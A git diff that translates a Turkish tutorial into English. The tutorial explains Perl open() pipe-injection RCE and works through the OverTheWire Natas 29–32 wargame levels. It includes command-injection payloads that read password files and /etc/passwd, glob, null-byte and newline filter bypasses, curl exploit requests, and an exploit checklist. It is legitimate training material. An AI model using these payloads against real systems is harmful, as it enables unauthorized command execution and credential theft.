@@ -1,23 +1,23 @@
-# 🌐 Web Güvenliği — Perl'de RCE (open() Injection)
+# 🌐 Web Security — RCE in Perl (open() Injection)
 
-> Perl'de `open(FILE, $filename)` bir dosya açar.
-> Ama `$filename` `|` ile başlar veya biterse, komut çalıştırır.
-
----
-
-## 📋 İçindekiler
-
-- [Perl open() Fonksiyonu](#perl-open-fonksiyonu)
-- [Pipe ile Komut Çalıştırma](#pipe-ile-komut-çalıştırma)
-- [Filtre Bypass Teknikleri](#filtre-bypass-teknikleri)
-- [Glob ile Bypass](#glob-ile-bypass)
-- [Natas'ta Kullanım](#natasta-kullanım)
+> In Perl, `open(FILE, $filename)` opens a file.
+> But if `$filename` starts or ends with `|`, it runs a command.
 
 ---
 
-## Perl open() Fonksiyonu
+## 📋 Table of Contents
 
-Perl'de dosya açmanın klasik yolu:
+- [The Perl open() Function](#the-perl-open-function)
+- [Running Commands with a Pipe](#running-commands-with-a-pipe)
+- [Filter Bypass Techniques](#filter-bypass-techniques)
+- [Bypass with Glob](#bypass-with-glob)
+- [Usage in Natas](#usage-in-natas)
+
+---
+
+## The Perl open() Function
+
+The classic way to open a file in Perl:
 
 ```perl
 open(FILE, $filename) or die "Cannot open: $!";
@@ -27,31 +27,31 @@ while (<FILE>) {
 close(FILE);
 ```
 
-Normal kullanımda `$filename` bir dosya yoludur. Ama Perl'in `open()` fonksiyonu özel bir özelliğe sahiptir.
+In normal use, `$filename` is a file path. But Perl's `open()` function has a special feature.
 
 ---
 
-## Pipe ile Komut Çalıştırma
+## Running Commands with a Pipe
 
-Perl'de `open()` fonksiyonu, dosya adı `|` karakteriyle **bitiyorsa** komutu çalıştırır:
+In Perl, the `open()` function runs a command if the file name **ends** with the `|` character:
 
 ```perl
-open(FILE, "ls -la |")    # ls komutunu çalıştır, çıktısını oku
-open(FILE, "cat /etc/passwd |")   # /etc/passwd oku
+open(FILE, "ls -la |")    # run the ls command, read its output
+open(FILE, "cat /etc/passwd |")   # read /etc/passwd
 
-# Veya başında | ile (write mode):
-open(FILE, "| mail user@example.com")   # komuta yaz
+# Or with | at the start (write mode):
+open(FILE, "| mail user@example.com")   # write to the command
 ```
 
-Yani `$filename = "cat /etc/natas_webpass/natas30 |"` → şifre okunur!
+So `$filename = "cat /etc/natas_webpass/natas30 |"` → the password is read!
 
 ---
 
-## Filtre Bypass Teknikleri
+## Filter Bypass Techniques
 
-Natas 29, "natas" kelimesini ve bazı karakterleri filtreler.
+Natas 29 filters the word "natas" and some characters.
 
-### Natas Filtresi
+### The Natas Filter
 
 ```perl
 if($. =~ /natas/) {
@@ -59,45 +59,45 @@ if($. =~ /natas/) {
 }
 ```
 
-`natas` kelimesi içeren dosya adları reddedilir.
+File names containing the word `natas` are rejected.
 
-### Glob (*) ile Bypass
+### Bypass with Glob (*)
 
-Perl'de ve shell'de `*` glob karakteri eşleşen dosyaları listeler:
+In Perl and in the shell, the `*` glob character lists matching files:
 
 ```
 /etc/natas_webpass/natas30
 ```
 
-`natas` filtreli ama glob kullanabiliriz:
+`natas` is filtered, but we can use a glob:
 
 ```perl
 open(FILE, "cat /etc/natas_webpass/nat* |")
-# nat* → natas30 ile eşleşir
+# nat* → matches natas30
 ```
 
-Veya daha spesifik:
+Or more specifically:
 
 ```
-/etc/natas_webpass/natas3?       → natas30-39 arası
-/etc/natas_webpass/natas30       → direkt (natas filtresi varsa)
+/etc/natas_webpass/natas3?       → natas30-39
+/etc/natas_webpass/natas30       → directly (if there's a natas filter)
 ```
 
-### Null Byte ile Bypass
+### Bypass with Null Byte
 
 ```
 filename = "cat /etc/natas_webpass/natas30 |\0"
 ```
 
-Bazı durumlarda null byte filtreyi karıştırabilir.
+In some cases a null byte can confuse the filter.
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
 ### Natas 29 — Perl CGI open() Injection
 
-**Kaynak kod (Perl CGI):**
+**Source code (Perl CGI):**
 
 ```perl
 #!/usr/bin/perl
@@ -105,7 +105,7 @@ use CGI qw(:standard);
 
 my $file = param('file');
 
-# Filtre: "natas" kelimesi varsa reddet
+# Filter: reject if the word "natas" is present
 if ($file =~ /natas/) {
     print "filtered";
 } else {
@@ -117,32 +117,32 @@ if ($file =~ /natas/) {
 }
 ```
 
-**Exploit — Glob ile:**
+**Exploit — With Glob:**
 
 ```
 file = cat /etc/natas_webpass/natas30 |
 ```
 
-Ama "natas" filtreli. Glob kullan:
+But "natas" is filtered. Use a glob:
 
 ```
 file = cat /etc/natas_webpass/nat?s30 |
 ```
 
-`nat?s30` → `natas30` ile eşleşir (`?` tek karakter wildcard).
+`nat?s30` → matches `natas30` (`?` is a single-character wildcard).
 
-**curl ile:**
+**With curl:**
 
 ```bash
-curl -u natas29:[şifre] \
+curl -u natas29:[password] \
      --data-urlencode "file=cat /etc/natas_webpass/natas30 |" \
      "http://natas29.natas.labs.overthewire.org/index.pl"
 ```
 
-Veya glob ile:
+Or with a glob:
 
 ```bash
-curl -u natas29:[şifre] \
+curl -u natas29:[password] \
      --data-urlencode "file=cat /etc/natas_webpass/nat?s30 |" \
      "http://natas29.natas.labs.overthewire.org/index.pl"
 ```
@@ -151,7 +151,7 @@ curl -u natas29:[şifre] \
 
 ### Natas 31 — Perl open() + Newline
 
-**Kaynak kod:**
+**Source code:**
 
 ```perl
 my $file = param('file');
@@ -159,55 +159,55 @@ open(FILE, $file) or die;
 while (<FILE>) { print $_; }
 ```
 
-Newline karakteri ile komut enjekte etme:
+Injecting a command with a newline character:
 
 ```
 file = /etc/passwd%0acat /etc/natas_webpass/natas32 |
 ```
 
-`%0a` → `\n` → Perl bunu ayrı komut olarak yorumlayabilir.
+`%0a` → `\n` → Perl may interpret this as a separate command.
 
 ---
 
-### Natas 32 — Ekstra Filtreler
+### Natas 32 — Extra Filters
 
-Daha fazla filtre varsa:
+If there are more filters:
 
 ```perl
-# Hem natas hem bazı özel karakterler filtrelenmiş
+# Both natas and some special characters are filtered
 ```
 
-Farklı glob kombinasyonları:
+Different glob combinations:
 
 ```bash
-# /etc/natas_webpass/ dizinini listele
+# List the /etc/natas_webpass/ directory
 file = ls /etc/natas_webpass/ |
 
-# Wildcard kombinasyonları
+# Wildcard combinations
 file = cat /etc/natas_webpass/natas3[0-9] |
 file = cat /etc/natas_webpass/nata??? |
 ```
 
 ---
 
-### Perl open() — Kontrol Listesi
+### Perl open() — Checklist
 
 ```
-Tespit:
-  ☐ Uygulama Perl CGI mi? (.pl uzantısı)
-  ☐ Parametre dosya adı olarak kullanılıyor mu?
-  ☐ open(), opendir() kullanılıyor mu?
+Detection:
+  ☐ Is the application Perl CGI? (.pl extension)
+  ☐ Is the parameter used as a file name?
+  ☐ Are open(), opendir() used?
 
 Exploit:
-  ☐ Dosya adına | ekle: "cat /etc/passwd |"
-  ☐ Glob kullan: nat?s30, nata*
-  ☐ "natas" filtresi varsa: nat?s veya nata? veya na*s
-  ☐ Newline ile çoklu komut: "%0akomut |"
+  ☐ Add | to the file name: "cat /etc/passwd |"
+  ☐ Use a glob: nat?s30, nata*
+  ☐ If there's a "natas" filter: nat?s or nata? or na*s
+  ☐ Multiple commands with a newline: "%0acommand |"
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [Perl — open()](https://perldoc.perl.org/functions/open)
 - [The Perl Jam 2 — Netanel Rubin](https://www.blackhat.com/docs/eu-14/materials/eu-14-Rubin-The-Perl-Jam-Exploiting-A-20-Year-Old-Vulnerability.pdf)
@@ -215,7 +215,7 @@ Exploit:
 
 ---
 
-**Önceki konu:** [20_ecb_mode_zafiyeti.md](./20_ecb_mode_zafiyeti.md)
-**Sonraki konu:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)
+**Previous topic:** [20_ecb_mode_vulnerability.md](./20_ecb_mode_vulnerability.md)
+**Next topic:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
